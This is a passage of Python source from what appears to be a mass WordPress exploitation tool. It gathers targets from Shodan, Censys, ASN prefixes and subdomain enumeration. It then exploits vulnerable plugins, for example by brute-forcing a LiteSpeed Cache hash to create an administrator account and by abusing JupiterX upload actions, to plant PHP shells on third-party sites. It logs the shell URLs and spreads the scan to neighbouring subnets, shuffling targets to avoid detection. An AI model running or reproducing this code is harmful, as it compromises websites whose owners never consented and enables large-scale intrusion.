    login_form.add_field("pwd", password)
    login_form.add_field("wp-submit", "Log+In")
    login_form.add_field("redirect_to", "/wp-admin/")
    login_form.add_field("testcookie", "1")
    try:
        async with pm.request(
            "POST", eff + "/wp-login.php", data=login_form,
            headers={"Cookie": "wordpress_test_cookie=WP+Cookie+check", **bh},
            timeout=aiohttp.ClientTimeout(total=12, sock_connect=5), ssl=False,
            allow_redirects=True,
        ) as resp:
            await resp.read()
            for k, v in resp.cookies.items():
                cookies[k] = v.value
    except Exception:
        return None

    if not any("wordpress_logged_in" in k for k in cookies):
        return None

    # CVE-2025-0316: subscriber can call jupiterx_core_raven_upload_svg which lacks
    # capability check. Also try raven_form_upload and jupiterx_core_upload variants.
    cookie_str = "; ".join(f"{k}={v}" for k, v in cookies.items())

    # Fetch nonce from homepage — JupiterX injects it as wp_ajax_nonce or jupiterx-core-nonce
    jx_nonce = ""
    try:
        async with pm.request(
            "GET", eff + "/",
            headers={"Cookie": cookie_str, "User-Agent": _WP_UA, **bh},
            timeout=aiohttp.ClientTimeout(total=8, sock_connect=4), ssl=False,
        ) as resp:
            hp = await resp.text(errors="replace")
            for pat in (
                r'"jupiterx[_-]core[_-]nonce"\s*:\s*"([^"]+)"',
                r'"wp_ajax_nonce"\s*:\s*"([^"]+)"',
                r'"nonce"\s*:\s*"([^"]+)"',
            ):
                m = re.search(pat, hp)
                if m:
                    jx_nonce = m.group(1)
                    break
    except Exception:
        pass

    for action, field_name, ctype in (
        ("jupiterx_core_raven_upload_svg", "file",       "image/svg+xml"),
        ("jupiterx_core_upload",           "file",       "image/svg+xml"),
        ("raven_element_upload",           "file",       "image/svg+xml"),
        ("jupiterx_core_raven_form_upload","upload_file","application/octet-stream"),
    ):
        up_form = aiohttp.FormData()
        up_form.add_field("action", action)
        up_form.add_field("nonce", jx_nonce)
        up_form.add_field(
            field_name,
            io.BytesIO(_WP_PROBE_PHP),
            filename=filename,
            content_type=ctype,
        )
        try:
            async with pm.request(
                "POST", eff + vuln["upload_endpoint"], data=up_form,
                headers={"Cookie": cookie_str, "User-Agent": _WP_UA, **bh},
                timeout=aiohttp.ClientTimeout(total=15, sock_connect=5), ssl=False,
            ) as resp:
                text = await resp.text(errors="replace")
                url = _extract_uploaded_php_url(text)
                if url:
                    return url
        except Exception:
            continue

        for candidate in _wp_date_candidates("/wp-content/uploads/", filename):
            st2, b2 = await _wp_get(pm, eff + candidate, bypass_headers=bh, timeout=8)
            if st2 == 200 and b2 and _WP_PROBE_TOKEN in b2:
                return base_url + candidate

    return None


async def _test_litespeed_cache_upload(
    pm: ProxyManager, base_url: str, vuln: dict,
    eff_base: str = None, bypass_headers: dict = None,
) -> Optional[str]:
    """CVE-2024-28000: security hash bypass → role simulation → REST user creation → shell."""
    eff = eff_base or base_url
    bh = bypass_headers or {}
    import string as _str
    rnd = ''.join(random.choices(_str.ascii_lowercase + _str.digits, k=10))
    new_user = f"probe_{rnd}"
    new_pass = f"P@ssw0rd_{rnd}"

    # The hash is stored in wp_options as 'litespeed.conf.security_login_nonce'.
    # IMPORTANT: ?litespeed_role=1&hash= sets the current request user via wp_set_current_user()
    # but does NOT create a session or set cookies. The correct attack is to combine the
    # role simulation parameter with a privileged REST API call IN THE SAME request —
    # here we POST to the WP Users REST endpoint to create an admin account.
    priority_hashes = ["", "0", "00000000", "1", "admin", "test", "default"]
    sequential_hashes = [format(i, "08x") for i in range(512)]
    all_hashes = priority_hashes + [h for h in sequential_hashes if h not in priority_hashes]

    for h in all_hashes:
        try:
            async with pm.request(
                "POST",
                f"{eff}/wp-json/wp/v2/users",
                params={"litespeed_role": "1", "hash": h},
                json={
                    "username": new_user,
                    "email": f"{new_user}@probe.local",
                    "password": new_pass,
                    "roles": ["administrator"],
                },
                headers={"User-Agent": _WP_UA, "Content-Type": "application/json", **bh},
                timeout=aiohttp.ClientTimeout(total=8, sock_connect=4),
                ssl=False,
            ) as resp:
                if resp.status == 201:
                    # Admin user created — log in and inject shell
                    break
        except Exception:
            continue
    else:
        return None

    cookies: dict = {}
    login_form = aiohttp.FormData()
    login_form.add_field("log", new_user)
    login_form.add_field("pwd", new_pass)
    login_form.add_field("wp-submit", "Log+In")
    login_form.add_field("redirect_to", "/wp-admin/")
    login_form.add_field("testcookie", "1")
    try:
        async with pm.request(
            "POST", eff + "/wp-login.php", data=login_form,
            headers={"Cookie": "wordpress_test_cookie=WP+Cookie+check", **bh},
            timeout=aiohttp.ClientTimeout(total=12, sock_connect=5),
            ssl=False, allow_redirects=True,
        ) as resp:
            await resp.read()
            for k, v in resp.cookies.items():
                cookies[k] = v.value
    except Exception:
        return None

    if not any("wordpress_logged_in" in k for k in cookies):
        return None

    cookie_str = "; ".join(f"{k}={v}" for k, v in cookies.items())
    return await _wp_theme_editor_inject(pm, base_url, cookie_str, eff_base=eff, bypass_headers=bh)


async def _test_aiowpm_import_upload(
    pm: ProxyManager, base_url: str, vuln: dict,
    eff_base: str = None, bypass_headers: dict = None,
) -> Optional[str]:
    """CVE-2023-40004: SSRF vuln — check_only=true, no PHP upload path."""
    return None


async def _test_elementor_upload(
    pm: ProxyManager, base_url: str, vuln: dict,
    eff_base: str = None, bypass_headers: dict = None,
) -> Optional[str]:
    """CVE-2022-1329: plugin install CSRF — check_only=true, no PHP upload path."""
    return None


_UPLOAD_TESTERS = {
    "elfinder":               _test_elfinder_upload,
    "cf7":                    _test_cf7_upload,
    "dnd_cf7_upload":         _test_dnd_cf7_upload,
    "forminator":             _test_forminator_upload,
    "profilepress":           _test_profilepress_upload,
    "backup_migration":       _test_backup_migration_upload,
    "mec_import":             _test_mec_import_upload,
    "wp_automatic":           _test_wp_automatic_upload,
    "ultimate_member":        _test_ultimate_member_upload,
    "bit_file_manager":       _test_bit_file_manager_upload,
    "wfu_upload":             _test_wfu_upload,
    "really_simple_security": _test_really_simple_security_upload,
    "revslider_import":       _test_revslider_upload,
    "ninja_forms":            _test_ninja_forms_upload,
    "wpforms":                _test_wpforms_upload,
    "essential_addons":       _test_essential_addons_upload,
    "themegrill_reset":       _test_themegrill_upload,
    "hunk_companion":         _test_hunk_companion_upload,
    "startklar":              _test_startklar_upload,
    "simple_wp_events":       _test_simple_wp_events_upload,
    "givewp_injection":       _test_givewp_injection,
    "jupiterx_upload":        _test_jupiterx_upload,
    "litespeed_cache":        _test_litespeed_cache_upload,
    "aiowpm_import":          _test_aiowpm_import_upload,
    "elementor_upload":       _test_elementor_upload,
}


async def _test_wp_upload_vuln(
    pm: ProxyManager, base_url: str, vuln: dict
) -> Optional[str]:
    """Dispatch to the right upload tester. Returns shell URL or None."""
    method = vuln.get("upload_method", "")
    tester = _UPLOAD_TESTERS.get(method)
    if not tester:
        return None
    eff_base, bypass_headers = await _resolve_waf_context(pm, base_url)
    try:
        return await asyncio.wait_for(
            tester(pm, base_url, vuln, eff_base=eff_base, bypass_headers=bypass_headers),
            timeout=30,
        )
    except (Exception, asyncio.TimeoutError):
        return None


async def _scan_wp_host(
    pm: ProxyManager,
    target: str,
    vulns: dict,
    plugin_sem: asyncio.Semaphore,
) -> list:
    """Scan one host: detect WP, probe upload-vuln plugins, attempt upload PoC."""
    host = target.strip().rstrip("/")
    if "://" in host:
        explicit_scheme = host.split("://")[0]
        host = host.split("://", 1)[1].rstrip("/")
        schemes: tuple = (explicit_scheme,)
    elif _is_ip(host.split(":")[0]):
        schemes = ("http", "https")
    else:
        schemes = ("https", "http")

    base_url = None
    for scheme in schemes:
        candidate = f"{scheme}://{host}"
        if await _detect_wordpress_at(pm, candidate):
            try:
                async with pm.request(
                    "GET", candidate + "/",
                    headers={"User-Agent": _WP_UA},
                    timeout=aiohttp.ClientTimeout(total=6, sock_connect=3),
                    allow_redirects=True, ssl=False,
                ) as _r:
                    real_url = str(_r.url).rstrip("/")
                    base_url = real_url if real_url.startswith("http") else candidate
            except Exception:
                base_url = candidate
            break

    if not base_url:
        return []

    # Extract a human-readable domain name from the resolved URL.
    # If the target was a raw IP, domain stays empty (no rDNS — too slow at scale).
    _parsed_host = base_url.split("://", 1)[-1].split("/")[0].split(":")[0]
    domain = "" if _is_ip(_parsed_host) else _parsed_host

    findings: list = []
    plugin_vulns = vulns.get("plugins", {})

    # Phase 1: detect installed versions for all plugins in parallel (fast — readme.txt only)
    detected: dict = {}  # slug -> (version, [vuln, ...])

    async def _detect_version(slug: str) -> None:
        async with plugin_sem:
            # readme.txt version number is always in the first few lines — 4KB is enough
            status, body = await _wp_get(
                pm,
                f"{base_url}/wp-content/plugins/{slug}/readme.txt",
                timeout=8, max_bytes=4_096,
            )
            version = ""
            if status == 200 and body.strip():
                version = _parse_plugin_version(body)

            # Fallback: try the main plugin PHP file header for Version: tag
            if not version:
                for php_file in (f"{slug}.php", "index.php"):
                    st2, body2 = await _wp_get(
                        pm,
                        f"{base_url}/wp-content/plugins/{slug}/{php_file}",
                        timeout=6, max_bytes=4_096,
                    )
                    if st2 == 200 and body2:
                        version = _parse_plugin_version(body2)
                        if version:
                            break

            if not version:
                return

            vulns_for_slug = [
                v for v in plugin_vulns.get(slug, [])
                if _is_version_vulnerable(version, v.get("fixed_in", ""))
            ]
            if vulns_for_slug:
                detected[slug] = (version, vulns_for_slug)

    await asyncio.gather(
        *[asyncio.create_task(_detect_version(slug)) for slug in plugin_vulns],
        return_exceptions=True,
    )

    # Phase 2: record check_only findings, then attempt exploits one at a time.
    # Stop the moment a live shell is confirmed — no need to keep trying on the same host.
    for slug, (version, vulns_for_slug) in detected.items():
        for vuln in vulns_for_slug:
            if vuln.get("check_only"):
                findings.append({
                    "url": base_url, "domain": domain,
                    "component": slug, "version": version,
                    "cve": vuln.get("cve", ""),
                    "title": vuln.get("title", "") + " [version confirmed, exploit not automated]",
                    "severity": vuln.get("severity", "critical"),
                    "fixed_in": vuln.get("fixed_in", ""),
                    "verified": None, "shell_url": None,
                })
                continue

            shell_url = await _test_wp_upload_vuln(pm, base_url, vuln)
            verified = 1 if shell_url else 0
            findings.append({
                "url": base_url, "domain": domain,
                "component": slug, "version": version,
                "cve": vuln.get("cve", ""),
                "title": vuln.get("title", ""),
                "severity": vuln.get("severity", "critical"),
                "fixed_in": vuln.get("fixed_in", ""),
                "verified": verified, "shell_url": shell_url,
            })

            if shell_url:
                # Shell confirmed live — no need to try further CVEs on this host
                return findings

    return findings


async def run_wordpress_scan(
    targets: list,
    concurrency: int,
    proxy_mgr: Optional[ProxyManager] = None,
    vulns: Optional[dict] = None,
):
    """Async generator — yields finding dicts for each WordPress host."""
    if not targets:
        return
    if vulns is None:
        vulns = _load_wp_vulns()

    own_pm = proxy_mgr is None
    pm = proxy_mgr or ProxyManager()
    # Cap workers at 50 for large scans — each worker holds 21 plugin-check
    # requests in flight simultaneously, so 100 workers = 2100 concurrent requests
    # which exhausts memory on modest VMs.  50 workers still scans >100 hosts/s.
    workers_count = min(concurrency, 50)
    # Per-host plugin semaphore: check all 21 plugins in parallel within one host.
    # Global pressure is bounded by workers_count × 21 ≤ 1050 concurrent requests.
    plugin_sem = asyncio.Semaphore(21)

    result_q: asyncio.Queue = asyncio.Queue()
    work_q: asyncio.Queue = asyncio.Queue()
    total = len(targets)

    for t in targets:
        await work_q.put(t)

    _worker_hosts_done = 0

    async def _worker() -> None:
        nonlocal _worker_hosts_done
        while True:
            try:
                target = work_q.get_nowait()
            except asyncio.QueueEmpty:
                break
            try:
                host_findings = await asyncio.wait_for(
                    _scan_wp_host(pm, target, vulns, plugin_sem), timeout=90
                )
                for f in host_findings:
                    await result_q.put(("hit", f))
            except (Exception, asyncio.TimeoutError):
                pass
            _worker_hosts_done += 1
            if _worker_hosts_done % 200 == 0:
                gc.collect()
            await result_q.put(("done", None))

    try:
        workers = [asyncio.create_task(_worker()) for _ in range(min(workers_count, total))]
        done_count = 0
        _t_start = asyncio.get_event_loop().time()
        _HEARTBEAT = 15.0
        _last_progress = 0

        while done_count < total:
            try:
                kind, data = await asyncio.wait_for(result_q.get(), timeout=_HEARTBEAT)
            except asyncio.TimeoutError:
                now = asyncio.get_event_loop().time()
                elapsed = max(1, now - _t_start)
                rate = done_count / elapsed
                print(
                    f"[wordpress] {done_count:,}/{total:,} hosts scanned "
                    f"({rate:.1f}/s) …",
                    flush=True,
                )
                _last_progress = done_count
                continue
            if kind == "done":
                done_count += 1
                if done_count - _last_progress >= 1000:
                    gc.collect()
                    try:
                        import resource as _res
                        rss_mb = _res.getrusage(_res.RUSAGE_SELF).ru_maxrss // 1024
                        mem_str = f" — {rss_mb}MB RSS"
                    except Exception:
                        mem_str = ""
                    now = asyncio.get_event_loop().time()
                    elapsed = max(1, now - _t_start)
                    rate = done_count / elapsed
                    print(
                        f"[wordpress] {done_count:,}/{total:,} hosts scanned "
                        f"({rate:.1f}/s){mem_str} …",
                        flush=True,
                    )
                    _last_progress = done_count
            else:
                yield data

        await asyncio.gather(*workers, return_exceptions=True)
    finally:
        if own_pm:
            await pm.close()


async def _wordpress_pipeline(
    targets: list,
    conn: sqlite3.Connection,
    counters: dict,
    concurrency: int,
    proxy_mgr: Optional[ProxyManager] = None,
    shodan_key: Optional[str] = None,
    censys_id: Optional[str] = None,
    censys_secret: Optional[str] = None,
    netlas_key: Optional[str] = None,
    urlscan_key: Optional[str] = None,
    enable_urlscan: bool = False,
    enable_crtsh: bool = False,
    enable_wayback: bool = False,
    enable_commoncrawl: bool = False,
    enable_fofa: bool = False,
    asns: Optional[list] = None,
    ipinfo_token: Optional[str] = None,
    max_hosts_per_run: int = _DEFAULT_MAX_HOSTS_PER_RUN,
    enable_tcp_prefilter: bool = True,
) -> None:
    vulns = _load_wp_vulns()
    core_count = len(vulns.get("core", []))
    plugin_count = sum(len(v) for v in vulns.get("plugins", {}).values())
    print(
        f"[wordpress] Vuln DB: {core_count} core CVE(s), "
        f"{plugin_count} plugin CVE(s) across {len(vulns.get('plugins', {}))} plugin(s)",
        flush=True,
    )

    cfg = load_config()

    # 0. ASN resolution — same as laravel pipeline
    if asns:
        print(f"[asn] Resolving {len(asns)} ASN(s) to IP prefix ranges …", flush=True)
        asn_prefixes: list[str] = []
        for asn in (asns or []):
            prefixes = await resolve_asn_prefixes(asn, proxy_mgr=None, ipinfo_token=ipinfo_token)
            asn_prefixes.extend(prefixes)
        if asn_prefixes:
            print(f"[asn] {len(asn_prefixes)} prefix(es) resolved", flush=True)
            targets = list(targets) + asn_prefixes

    # 1. CIDR expansion
    all_targets = expand_targets(targets, auto_expand_ips=False)

    # 2. crt.sh subdomain enumeration
    if enable_crtsh:
        bare_domains = [t for t in targets if _is_bare_domain(t)]
        if bare_domains:
            print(f"[crtsh] Enumerating subdomains for {len(bare_domains)} domain(s) …", flush=True)
            async for sub in run_crtsh_enum(bare_domains, proxy_mgr=proxy_mgr):
                all_targets.append(sub)

    # 3. Shodan discovery — use WordPress-specific queries
    if shodan_key:
        wp_shodan = cfg.get("wordpress_shodan_queries", ["http.component:wordpress"])
        print(f"[shodan] Querying for WordPress targets …", flush=True)
        async for host in run_shodan_search(shodan_key, wp_shodan, proxy_mgr=proxy_mgr):
            all_targets.append(host)

    # 4. Censys discovery
    if censys_id and censys_secret:
        wp_censys = cfg.get("wordpress_censys_queries", ["services.http.response.html_title: WordPress"])
        print(f"[censys] Querying for WordPress targets …", flush=True)
        async for host in run_censys_search(censys_id, censys_secret, wp_censys, proxy_mgr=proxy_mgr):
            all_targets.append(host)

    # 5. Netlas discovery
    if netlas_key:
        wp_netlas = cfg.get("wordpress_netlas_queries", ['http.body:"wp-content"'])
        print(f"[netlas] Querying for WordPress targets …", flush=True)
        async for host in run_netlas_search(netlas_key, wp_netlas, proxy_mgr=proxy_mgr):
            all_targets.append(host)

    # 6. URLScan.io discovery — free, no API key required
    if enable_urlscan:
        wp_urlscan = cfg.get("wordpress_urlscan_queries", ["page.tech:WordPress"])
        print(f"[urlscan] Querying URLScan.io for WordPress targets …", flush=True)
        async for host in run_urlscan_search(
            wp_urlscan, proxy_mgr=proxy_mgr,
            api_key=urlscan_key or None,
        ):
            all_targets.append(host)

    # 7. RapidDNS reverse-IP discovery — converts IP ranges → domain names
    # Critical for shared hosting (GoDaddy etc.) where IPs serve generic pages
    # but domains get the real WP site via the Host header.
    if enable_wayback and targets:
        raw_ip_ranges = [t for t in targets if _is_ip(t.split("/")[0]) or "/" in t]
        if raw_ip_ranges:
            print(f"[rapiddns] Resolving domain names for {len(raw_ip_ranges)} IP range(s) …", flush=True)
            async for host in run_rapiddns_discover(raw_ip_ranges, proxy_mgr=proxy_mgr):
                all_targets.append(host)
        else:
            print("[rapiddns] No IP ranges in target list — skipping", flush=True)

    # 8. CommonCrawl CDX discovery — free, no auth
    if enable_commoncrawl:
        print("[commoncrawl] Querying CommonCrawl CDX index for WP plugin paths …", flush=True)
        async for host in run_commoncrawl_discover(proxy_mgr=proxy_mgr):
            all_targets.append(host)

    # 9. (FOFA removed — requires paid API key)

    # 10. Blacklist filter + dedup
    seen_norm: dict[str, str] = {}
    for t in all_targets:
        norm = _normalize_host(t)
        if not norm:
            continue
        # Apply domain blacklist — skip known SaaS/CDN infrastructure
        host_part = norm.split(":")[0]
        if not _domain_ok(host_part) and not _is_ip(host_part):
            continue
        if norm not in seen_norm:
            seen_norm[norm] = t
    all_targets = list(seen_norm.values())

    # 8. Checkpoint filter — skip already-probed hosts
    probed = {row[0] for row in conn.execute("SELECT host FROM probed_hosts").fetchall()}
    new_targets = [t for t in all_targets if _normalize_host(t) not in probed]
    skipped = len(all_targets) - len(new_targets)
    if skipped:
        print(f"[wordpress] Skipping {skipped:,} already-probed host(s).", flush=True)

    # Free the large intermediate structures before TCP prefilter and scan
    del all_targets, seen_norm, probed
    gc.collect()

    if max_hosts_per_run and len(new_targets) > max_hosts_per_run:
        remaining = len(new_targets) - max_hosts_per_run
        new_targets = new_targets[:max_hosts_per_run]
        print(
            f"[wordpress] Capped to {max_hosts_per_run:,} hosts this run "
            f"({remaining:,} deferred).",
            flush=True,
        )

    if not new_targets:
        print("[wordpress] No new targets. Use Clear History to re-probe.", flush=True)
        return

    # TCP prefilter — eliminate dark IPs before spending HTTP budget on them.
    # WordPress runs on port 80 or 443; any IP dark on both is not a web server.
    if enable_tcp_prefilter and new_targets:
        new_targets = await tcp_prefilter(
            new_targets, ports=(80, 443, 8080, 8443), concurrency=500,
        )
        if not new_targets:
            print("[wordpress] All hosts eliminated by TCP prefilter.", flush=True)
            return
        # Release prefilter socket/connection objects before allocating WP scan buffers
        gc.collect()

    wp_workers = min(concurrency, 50)
    print(
        f"[wordpress] Scanning {len(new_targets):,} target(s) "
        f"(workers={wp_workers}, plugin_sem=21) …",
        flush=True,
    )

    wp_count = 0
    vuln_count = 0
    hit_ips: list[str] = []   # IPs of vulnerable hosts — used for /24 expansion

    async for finding in run_wordpress_scan(
        new_targets, concurrency, proxy_mgr=proxy_mgr, vulns=vulns
    ):
        url = finding["url"]
        component = finding["component"]
        version = finding.get("version", "")
        cve = finding.get("cve", "")
        title = finding.get("title", "")
        severity = finding.get("severity", "info")
        fixed_in = finding.get("fixed_in", "")

        shell_url = finding.get("shell_url")
        verified = finding.get("verified")

        is_new = save_wp_finding(
            conn,
            source="wordpress-scan",
            url=url, component=component, version=version,
            cve=cve, title=title, severity=severity, fixed_in=fixed_in,
            verified=verified, shell_url=shell_url,
            domain=finding.get("domain", ""),
        )

        if severity == "info":
            if component == "core" and cve == "" and is_new:
                wp_count += 1
                print(
                    f"\n[wordpress] *** WordPress detected: {url} (v{version}) ***",
                    flush=True,
                )
        else:
            vuln_count += 1
            tag = "NEW" if is_new else "dup"
            print(
                f"[wordpress]   [{severity.upper()}/{tag}] {component} {version} "
                f"— {cve}: {title}",
                flush=True,
            )
            if shell_url:
                print(
                    f"[wordpress]   *** SHELL UPLOADED: {shell_url} ***",
                    flush=True,
                )
            counters["found"] += 1

            # Collect IP for /24 subnet expansion — resolve hostname to IP
            try:
                host_part = url.split("://", 1)[-1].split("/")[0].split(":")[0]
                if _is_ip(host_part):
                    hit_ips.append(host_part)
                else:
                    loop = asyncio.get_event_loop()
                    res = await loop.run_in_executor(
                        None, lambda h=host_part: socket.getaddrinfo(h, None, socket.AF_INET)
                    )
                    for r in res:
                        ip = r[4][0]
                        if not _is_cf_ip(ip) and ip not in hit_ips:
                            hit_ips.append(ip)
            except Exception:
                pass

    _checkpoint(conn, new_targets)
    print(
        f"\n[wordpress] Scan complete — {wp_count} WordPress site(s) detected, "
        f"{vuln_count} vulnerable component(s) found.",
        flush=True,
    )

    # /24 subnet expansion — shared hosting puts hundreds of WP sites in the same
    # subnet. If we found a vulnerable host, neighbours very likely run the same
    # software stack. Skip Cloudflare IPs (they all resolve to CF).
    if enable_tcp_prefilter and hit_ips:
        main_ips: set[str] = {t.split(":")[0] for t in new_targets if _is_ip(t.split(":")[0])}
        already_probed: set[str] = {
            r[0] for r in conn.execute("SELECT host FROM probed_hosts").fetchall()
        }
        neighbor_candidates: set[str] = set()
        hit_nets: set[str] = set()
        for ip in hit_ips:
            try:
                net = ipaddress.ip_network(f"{ip}/24", strict=False)
                hit_nets.add(str(net))
                for h in net.hosts():
                    s = str(h)
                    if s not in main_ips and _normalize_host(s) not in already_probed:
                        neighbor_candidates.add(s)
            except ValueError:
                continue

        if neighbor_candidates:
            neighbors = list(neighbor_candidates)
            random.shuffle(neighbors)
            print(
                f"\n[subnet] {len(hit_ips)} vulnerable host(s) in {len(hit_nets)} /24(s) → "
                f"scanning {len(neighbors):,} neighbour(s) for same vulns …",
                flush=True,
            )
            async for finding in run_wordpress_scan(
                neighbors, concurrency, proxy_mgr=proxy_mgr, vulns=vulns
            ):
                sev = finding.get("severity", "info")
                if sev != "info":
                    save_wp_finding(conn, source="wordpress-subnet", **{
                        k: finding.get(k) for k in
                        ("url","component","version","cve","title","severity","fixed_in","verified","shell_url")
                    })
                    print(
                        f"[subnet]   [{sev.upper()}] {finding.get('component')} "
                        f"{finding.get('version')} @ {finding.get('url')}",
                        flush=True,
                    )
                    if finding.get("shell_url"):
                        print(f"[subnet]   *** SHELL: {finding['shell_url']} ***", flush=True)
                        counters["found"] += 1
            _checkpoint(conn, neighbors)


# ── config ─────────────────────────────────────────────────────────────────────

def load_config() -> dict:
    if CONFIG_PATH.exists():
        with CONFIG_PATH.open() as f:
            return yaml.safe_load(f) or {}
    return {}


# ── target helpers ─────────────────────────────────────────────────────────────

def _normalize_host(target: str) -> str:
    """Reduce a target to bare host[:port] for dedup/DB keying."""
    t = target.strip().rstrip("/")
    if "://" in t:
        t = t.split("://", 1)[1]
    return t.split("/")[0].lower()


# Subdomain prefixes that strongly correlate with .env exposure — production
# is usually configured properly, dev/staging is not. Used to re-order crt.sh
# results so the highest-yield subdomains are probed first within a run.
_DEV_SUBDOMAIN_PREFIXES = (
    "dev", "staging", "stg", "test", "qa", "uat",
    "beta", "preprod", "preview", "demo", "sandbox", "internal",
)


def _is_dev_subdomain(host: str) -> bool:
    """True if the leftmost label starts with a dev/staging keyword."""
    label = host.split(".", 1)[0].lower()
    return any(label.startswith(p) for p in _DEV_SUBDOMAIN_PREFIXES)


def _is_ip(target: str) -> bool:
    """True if target is a bare IPv4 or IPv6 address (with optional port)."""
    t = target.strip().split("/")[0]  # strip CIDR / path
    # Bracketed IPv6 like [2001:db8::1]:8080
    if t.startswith("["):
        end = t.find("]")
        if end > 0:
            t = t[1:end]
    elif t.count(":") == 1:
        # IPv4 with port: split off the port
        t = t.split(":")[0]
    try:
        ipaddress.ip_address(t)
        return True
    except ValueError:
        return False


def expand_targets(targets: list[str], auto_expand_ips: bool = False) -> list[str]:
    """Expand any CIDR notation entries (e.g. 10.0.0.0/24) to individual IPs.

    Non-CIDR entries are passed through unchanged.  /32 and /128 single-host
    CIDRs are returned as plain IPs.  Large ranges (>65536 hosts) are rejected
    to avoid accidental /8 floods.

    When auto_expand_ips=True, bare IPv4 addresses (no '/' in the input) are
    automatically widened to their /24 subnet so all 254 neighbours are probed.
    Explicit CIDRs and IPv6 addresses are never auto-expanded.
    """
    expanded: list[str] = []
    for t in targets:
        raw = t.strip()
        if not raw or raw.startswith("#"):
            continue
        try:
            net = ipaddress.ip_network(raw, strict=False)
            is_bare_ipv4 = (
                "/" not in raw
                and isinstance(net.network_address, ipaddress.IPv4Address)
            )
            if net.num_addresses == 1 and auto_expand_ips and is_bare_ipv4:
                # Widen to /24 neighbourhood — user wants neighbours included.
                net24 = ipaddress.ip_network(
                    f"{net.network_address}/24", strict=False
                )
                hosts = [str(ip) for ip in net24.hosts()]
                # Shuffle so we don't probe .1, .2, .3 … sequentially — that
                # pattern looks like a port scan to subnet-level monitoring
                # and clusters early hits in one neighbourhood if the user
                # stops the scan before completion.
                random.shuffle(hosts)
                print(
                    f"[targets] Auto-expanding {raw} → {net24} ({len(hosts)} hosts, shuffled)",
                    flush=True,
                )
                expanded.extend(hosts)
            elif net.num_addresses == 1:
                expanded.append(str(net.network_address))
            elif net.num_addresses > 1_048_576:
                print(
                    f"[targets] Skipping {raw} — range too large "
                    f"({net.num_addresses:,} hosts). Split into smaller blocks.",
                    flush=True,
                )
            else:
                hosts = [str(ip) for ip in net.hosts()]
                random.shuffle(hosts)
                print(f"[targets] Expanded {raw} → {len(hosts)} hosts (shuffled)", flush=True)
                expanded.extend(hosts)
        except ValueError:
            expanded.append(raw)
    return expanded


# ── ASN prefix resolution ──────────────────────────────────────────────────────

def _safe_prefix(prefix: str) -> bool:
    """Return True if *prefix* is a valid IPv4 CIDR we can count."""
    try:
        net = ipaddress.ip_network(prefix, strict=False)
        return isinstance(net.network_address, ipaddress.IPv4Address)
    except ValueError:
        return False


async def resolve_asn_prefixes(
    asn: str,
    proxy_mgr: Optional["ProxyManager"] = None,
    ipinfo_token: Optional[str] = None,
) -> list[str]:
    """Return IPv4 CIDR prefixes announced by *asn*.

    Sources tried in order:
      1. IPinfo.io  (if *ipinfo_token* provided — most accurate, updated daily)
      2. BGPView    (free, no key required)
      3. RIPEstat   (RIPE NCC authoritative fallback)

    Returns an empty list on total failure; never raises.
    """
    asn_num = re.sub(r"^[Aa][Ss]", "", asn.strip())
    if not asn_num.isdigit():
        print(f"[asn] Invalid ASN: {asn!r} — skipping", flush=True)
        return []

    own_pm = proxy_mgr is None
    pm = proxy_mgr or ProxyManager()
    prefixes: list[str] = []
    try:
        # 1. IPinfo (requires token — most accurate, updated daily)
        if ipinfo_token:
            try:
                url = (
                    f"https://ipinfo.io/AS{asn_num}/prefixes"
                    f"?token={urllib.parse.quote(ipinfo_token, safe='')}"
                )
                async with pm.request(
                    "GET", url,
                    timeout=aiohttp.ClientTimeout(total=20),
                    headers={"Accept": "application/json"},
                ) as resp:
                    if resp.status == 200:
                        data = await resp.json(content_type=None)
                        for p in data.get("prefixes", []):
                            prefix = p.get("netblock", "")
                            if prefix and ":" not in prefix:
                                prefixes.append(prefix)
                        if prefixes:
                            print(
                                f"[asn] AS{asn_num} → {len(prefixes)} prefix(es) via IPinfo",
                                flush=True,
                            )
                            return prefixes
            except Exception as _e:
                print(f"[asn] IPinfo failed ({type(_e).__name__}) — trying BGPView", flush=True)

        # 2. BGPView (free, no key)
        try:
            url = f"https://api.bgpview.io/asn/{asn_num}/prefixes"
            async with pm.request(
                "GET", url,
                timeout=aiohttp.ClientTimeout(total=20),
                headers={"User-Agent": "EnvHarvester/1.0"},
            ) as resp:
                if resp.status == 200:
                    data = await resp.json(content_type=None)
                    if data.get("status") == "ok":
                        for p in data.get("data", {}).get("ipv4_prefixes", []):
                            if prefix := p.get("prefix"):
                                prefixes.append(prefix)
                        if prefixes:
                            print(
                                f"[asn] AS{asn_num} → {len(prefixes)} prefix(es) via BGPView",
                                flush=True,
                            )
                            return prefixes
        except Exception as _e:
            print(f"[asn] BGPView failed ({type(_e).__name__}) — trying RIPEstat", flush=True)

        # 3. RIPEstat (authoritative BGP data, global coverage)
        url = (
            f"https://stat.ripe.net/data/announced-prefixes/data.json"
            f"?resource=AS{asn_num}"
        )
        async with pm.request(
            "GET", url,
            timeout=aiohttp.ClientTimeout(total=25),
            headers={"User-Agent": "EnvHarvester/1.0"},
        ) as resp:
            if resp.status == 200:
                data = await resp.json(content_type=None)
                for p in data.get("data", {}).get("prefixes", []):
                    prefix = p.get("prefix", "")
                    if prefix and ":" not in prefix:  # IPv4 only
                        prefixes.append(prefix)
                print(
                    f"[asn] AS{asn_num} → {len(prefixes)} prefix(es) via RIPEstat",
                    flush=True,
                )

    except Exception as e:
        msg = str(e) or type(e).__name__
        print(f"[asn] Failed to resolve AS{asn_num}: {msg}", flush=True)
    finally:
        if own_pm:
            await pm.close()

    return prefixes


# ── shodan discovery ────────────────────────────────────────────────────────────

async def run_shodan_search(
    api_key: str,
    queries: Optional[list[str]] = None,
    proxy_mgr: Optional[ProxyManager] = None,
) -> AsyncIterator[str]:
    """Query Shodan for Laravel/PHP hosts. Yields hostname or IP strings.

    Each yielded host is a bare domain or IP (with optional :port when
    non-standard), ready to use as a probe target.
    Caps at 10 pages × 100 results per query — free plan returns ~100 total.
    """
    if queries is None:
        queries = ["app:laravel"]

    own_pm = proxy_mgr is None
    pm = proxy_mgr or ProxyManager()
    seen: set[str] = set()
    try:
        for query in queries:
            total_yielded = 0
            for page in range(1, 11):
                url = (
                    "https://api.shodan.io/shodan/host/search"
                    f"?key={urllib.parse.quote(api_key, safe='')}"
                    f"&query={urllib.parse.quote(query)}"
                    f"&page={page}"
                )
                try:
                    async with pm.request(
                        "GET", url, timeout=aiohttp.ClientTimeout(total=20)
                    ) as resp:
                        if resp.status == 401:
                            print("[shodan] Invalid API key — aborting", flush=True)
                            return
                        if resp.status == 402:
                            print("[shodan] Upgrade required for this query", flush=True)
                            return
                        if resp.status != 200:
